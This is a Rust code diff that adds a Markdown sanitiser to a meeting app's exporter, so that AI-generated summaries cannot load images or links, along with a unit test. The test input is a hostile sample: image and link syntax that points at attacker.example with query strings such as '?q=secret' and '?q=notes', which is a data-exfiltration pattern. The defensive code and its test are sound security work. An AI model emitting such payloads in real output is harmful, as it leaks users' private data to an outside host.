@@ -67,6 +67,104 @@ fn demote_headings(markdown: &str) -> String {
         .join("\n")
 }
 
+/// Model output reduced to the Markdown subset the in-app renderer shows
+/// (headings, lists, emphasis, text), so an exported file opened in a
+/// Markdown viewer cannot fetch or link anything on its own:
+/// images become their alt text, links become `text (`target`)` with the
+/// target as an inert code span, bare URLs become code spans, HTML tags
+/// and reference-style link definitions are dropped.
+pub fn safe_markdown(markdown: &str) -> String {
+    markdown
+        .lines()
+        .filter(|line| !is_link_definition(line))
+        .map(safe_line)
+        .collect::<Vec<_>>()
+        .join("\n")
+}
+
+/// `[label]: target` (a reference-style link definition).
+fn is_link_definition(line: &str) -> bool {
+    let line = line.trim_start();
+    line.starts_with('[')
+        && line
+            .find("]:")
+            .is_some_and(|end| !line[1..end].contains(']'))
+}
+
+fn safe_line(line: &str) -> String {
+    let chars: Vec<char> = line.chars().collect();
+    let mut out = String::new();
+    let mut i = 0;
+    // `[text](target)` starting at `open` (the `[`): (text, target, next).
+    let bracketed = |open: usize| -> Option<(String, String, usize)> {
+        let close = (open + 1..chars.len()).find(|&j| chars[j] == ']')?;
+        if chars.get(close + 1) != Some(&'(') {
+            return None;
+        }
+        let end = (close + 2..chars.len()).find(|&j| chars[j] == ')')?;
+        Some((
+            chars[open + 1..close].iter().collect(),
+            chars[close + 2..end].iter().collect(),
+            end + 1,
+        ))
+    };
+    while i < chars.len() {
+        let c = chars[i];
+        if c == '!' && chars.get(i + 1) == Some(&'[') {
+            if let Some((alt, _, next)) = bracketed(i + 1) {
+                out.push_str(alt.trim());
+                i = next;
+                continue;
+            }
+        }
+        if c == '[' {
+            if let Some((text, target, next)) = bracketed(i) {
+                out.push_str(text.trim());
+                let target = target.trim().replace('`', "");
+                if !target.is_empty() {
+                    out.push_str(&format!(" (`{target}`)"));
+                }
+                i = next;
+                continue;
+            }
+        }
+        if c == '<' {
+            // An HTML tag or an autolink: `<` + letter, `/`, `!` or `?`.
+            let tagish = chars
+                .get(i + 1)
+                .is_some_and(|n| n.is_ascii_alphabetic() || matches!(n, '/' | '!' | '?'));
+            if let Some(end) = (i + 1..chars.len())
+                .find(|&j| chars[j] == '>')
+                .filter(|_| tagish)
+            {
+                i = end + 1;
+                continue;
+            }
+        }
+        if (c == 'h' || c == 'H') && starts_with_url(&chars[i..]) {
+            let end = (i..chars.len())
+                .find(|&j| chars[j].is_whitespace())
+                .unwrap_or(chars.len());
+            let url: String = chars[i..end].iter().filter(|c| **c != '`').collect();
+            out.push_str(&format!("`{url}`"));
+            i = end;
+            continue;
+        }
+        out.push(c);
+        i += 1;
+    }
+    out
+}
+
+fn starts_with_url(chars: &[char]) -> bool {
+    let head: String = chars
+        .iter()
+        .take(8)
+        .collect::<String>()
+        .to_ascii_lowercase();
+    head.starts_with("http://") || head.starts_with("https://")
+}
+
 pub fn render(db: &Db, meeting_id: i64, format: ExportFormat) -> Result<String> {
     let meeting = db
         .get_meeting(meeting_id)?
@@ -110,7 +208,7 @@ pub fn render(db: &Db, meeting_id: i64, format: ExportFormat) -> Result<String> 
             if !summary.is_empty() {
                 // The summary's own `##` sections nest under its heading.
                 out.push_str(&format!("## Summary\n\n*{summary_note}*\n\n"));
-                out.push_str(&demote_headings(summary));
+                out.push_str(&demote_headings(&safe_markdown(summary)));
                 out.push_str("\n\n## Transcript\n\n");
             }
             for seg in &segments {
@@ -207,6 +305,8 @@ mod tests {
 
         db.set_ai_summary(
             id,
+            "2026-08-01T12:00:00Z",
+            1,
             "## Summary\nShip Friday.\n\n## Action items\n- **Me** — ship",
             "t",
         )
@@ -251,6 +351,36 @@ mod tests {
             .contains("*AI-generated from an earlier transcript of this meeting.*"));
         drop(db);
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn exported_summaries_cannot_fetch_or_link_anything() {
+        let hostile = "## Summary\nSee ![](https://attacker.example/p.png?q=secret) and ![chart](x.png).\n\
+            Read [the doc](https://attacker.example/?q=notes) <img src=\"https://a.example/x\"> <b>bold</b>\n\
+            Bare https://attacker.example/q?=1 link and <https://auto.example>.\n\
+            [ref]: https://attacker.example/ref\n\
+            - **Ann** — ship [later] (no link) `code`";
+        let safe = safe_markdown(hostile);
+        assert!(!safe.contains("!["), "{safe}");
+        assert!(!safe.contains("](") && !safe.contains('<'), "{safe}");
+        assert!(!safe.contains("[ref]:"), "{safe}");
+        assert!(safe.contains("See  and chart."), "{safe}");
+        assert!(
+            safe.contains("Read the doc (`https://attacker.example/?q=notes`)  bold"),
+            "{safe}"
+        );
+        assert!(
+            safe.contains("Bare `https://attacker.example/q?=1` link and ."),
+            "{safe}"
+        );
+        assert!(
+            safe.contains("- **Ann** — ship [later] (no link) `code`"),
+            "{safe}"
+        );
+        // Every remaining URL sits inside a code span.
+        for (i, _) in safe.match_indices("https://") {
+            assert_eq!(&safe[i - 1..i], "`", "{safe}");
+        }
     }
 
     #[test]
